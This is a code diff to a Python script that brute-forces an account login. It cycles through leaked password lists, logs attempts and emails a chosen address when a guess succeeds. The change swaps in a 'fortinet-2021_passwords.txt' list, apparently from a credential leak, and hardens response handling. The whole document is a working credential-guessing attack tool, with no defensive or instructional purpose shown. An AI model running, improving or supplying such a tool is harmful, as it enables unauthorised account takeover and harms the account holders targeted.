@@ -160,7 +160,7 @@ def main():
     username = input("Enter username or email/phone number: ")
     receiver_email = input("Enter email to receive notifications: ")
 
-    passwords = read_passwords('darkweb2017-top10000.txt')  # Change file if needed
+    passwords = read_passwords('fortinet-2021_passwords.txt')  # Updated file
     total_attempts = 0
     start_time = time.time()
 
@@ -177,13 +177,13 @@ def main():
             send_email(True, username, password, receiver_email)
             break
         else:
-            print_box("Failed", f"Guessed password: {password}", "Login Failed", response.status_code, response.headers)
+            print_box("Failed", f"Guessed password: {password}", "Login Failed", response.status_code if response else "No response", response.headers if response else "No response")
         
         total_attempts += 1
         log_attempt(username, password, success=False)
 
         track_passwords_per_minute(start_time, total_attempts)
-        estimate_time_left(total_attempts, ['darkweb2017-top10000.txt'], start_time)
+        estimate_time_left(total_attempts, ['fortinet-2021_passwords.txt'], start_time)
 
 if __name__ == "__main__":
     main()
